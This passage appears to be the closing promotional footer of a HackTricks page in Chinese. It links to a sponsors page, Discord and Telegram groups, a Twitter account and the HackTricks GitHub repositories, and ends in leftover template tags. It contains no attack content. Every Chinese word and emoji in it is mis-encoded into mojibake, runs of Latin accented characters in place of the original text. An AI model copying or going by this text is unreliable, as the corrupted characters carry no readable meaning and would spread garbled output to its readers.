* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}
